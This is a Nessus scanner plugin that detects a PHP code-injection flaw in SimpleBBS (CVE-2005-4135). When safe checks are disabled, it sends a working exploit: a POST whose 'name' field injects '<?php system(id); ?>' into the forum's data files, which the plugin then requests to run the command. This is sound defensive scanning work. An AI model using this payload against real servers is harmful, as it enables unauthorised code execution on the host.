#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to an
arbitrary command execution vulnerability. 

Description :

The remote host appears to be running SimpleBBS, an open-source
bulletin board system written in PHP. 

The version of SimpleBBS installed on the remote host fails to
sanitize user-supplied input to the 'name' parameter of the
'index.php' script when creating a new topic and adds that input to
several PHP files.  An attacker can leverage this flaw to inject
arbitrary PHP code into the application and then call one of those
files directly to cause that code to be executed on the remote host
subject to the privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/418838

Solution :

Limit the ability to create new topics to trusted users.

Risk factor :

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:I)";


if (description) {
  script_id(20303);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-4135");
  script_bugtraq_id(15764);

  script_name(english:"SimpleBBS name Parameter Arbitrary Command Execution Vulnerability");
  script_summary(english:"Checks for name parameter arbitrary command execution vulnerability in SimpleBBS");
 
  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/simplebbs", "/forum", "/sbbs", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure it's SimpleBBS.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it is...
  if ("Powered by SimpleBBS" >< res) {
    # Grab the version number in case we need it later.
    pat = "Powered by SimpleBBS v(.+)";
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        ver = eregmatch(pattern:pat, string:match);
        if (!isnull(ver)) {
          ver = ver[1];
          break;
        }
      }
    }

    # If safe checks are not enabled...
    if (!safe_checks()) {
      # Try to exploit the flaw to run a command.
      cmd = "id";
      uniq_str = unixtime();
      # - First, inject it.
      postdata = string(
        'name=<!-- ', uniq_str, "<?php system(", cmd, "); ?> ", SCRIPT_NAME, " -->&",
        "subject=Test&", 
        "message=Just+a+test&",
        "sendTopic=Send"
      );
      req = string(
        "POST ", dir, "/index.php?v=newtopic&c=1 HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # - Now, try to run it.
      #
      #   nb: if the flaw has already been exploited, we may not get
      #       to see our output.
      req = http_get(item:string(dir, "/data/posts.php"), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      # nb: there might not be any posts yet.
      # if (res == NULL) exit(0);

      # There's a problem if...
      if (
        # We see our identifier and...
        uniq_str >< res &&
        (
          # the output looks like it's from id or...
          egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
          # PHP's disable_functions prevents running system().
          egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
        )
      ) {
        if (report_verbosity > 0) {
          output = strstr(res, string("<!-- ", uniq_str));
          if (output) output = output - strstr(output, string(SCRIPT_NAME, " -->"));
          if (output) output = output - string("<!-- ", uniq_str);
          if (isnull(output)) output = res;

          report = string(
            desc,
            "\n\n",
            "Plugin output :\n",
            "\n",
            "Nessus was able to execute the command 'id' on the remote host;\n",
            "the output was:\n",
            "\n",
            output
          );
        }
        else report = desc;

        security_hole(port:port, data:report);
        exit(0);
      }
    }

    # Do a banner check in case safe checks were enabled or 
    # an exploit has already been run.
    if (ver =~ "^1\.(0|1([^0-9]|$))") {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus determined the flaw exists on the remote host based solely\n",
        "on the version number of SimpleBBS found in the banner."
      );
      security_hole(port:port, data:report);
      exit(0);
    }
  }
}
